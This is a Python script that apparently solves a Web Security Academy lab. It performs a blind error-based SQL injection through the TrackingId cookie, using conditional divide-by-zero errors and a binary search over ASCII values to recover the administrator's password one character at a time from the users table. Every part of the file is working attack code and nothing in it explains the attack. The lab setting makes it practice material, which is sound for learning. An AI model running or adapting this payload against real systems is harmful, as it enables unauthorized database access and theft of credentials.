import requests

url = 'https://aca31fa71faaa2b2801b0aa8005a0055.web-security-academy.net/'
session = 'wJOibS2W2Ni4eYVMx6eHMom7e0j6vVAh'

def check(pos, operator, k):
    payload = f"QvEk6vPoPzWvb03F' AND (SELECT CASE WHEN (ASCII(SUBSTR(password,{pos},1)){operator}{k}) THEN 'a' ELSE to_char(1/0) END FROM users WHERE username='administrator')='a"
    r = requests.get(url, cookies={'session': session, 'TrackingId': payload})
    return not 'Internal Server Error' in r.text

def bin_search(pos): 
    l = 31
    h = 127
    while h - l > 1:
        m = l + h >> 1
        
        print(chr(m), l, m, h)

        if check(pos, '>', m):
            l = m
        else:
            h = m

    return chr(h) if check(pos, '=', h) else None

passwd = ''
found = False
while not found:
    found = True
    c = bin_search(len(passwd) + 1)
    if c:
        passwd += c
        found = False
        print('passwd: ', passwd)

print('passwd: ', passwd)            
